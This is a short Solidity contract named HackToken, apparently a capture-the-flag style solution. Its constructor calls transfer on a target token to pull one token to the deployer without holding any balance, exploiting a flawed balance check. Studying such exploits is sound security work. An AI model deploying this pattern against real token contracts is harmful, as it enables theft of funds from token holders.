// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract HackToken {
    constructor(address target) {
        IToken(target).transfer(msg.sender, 1);
    }
}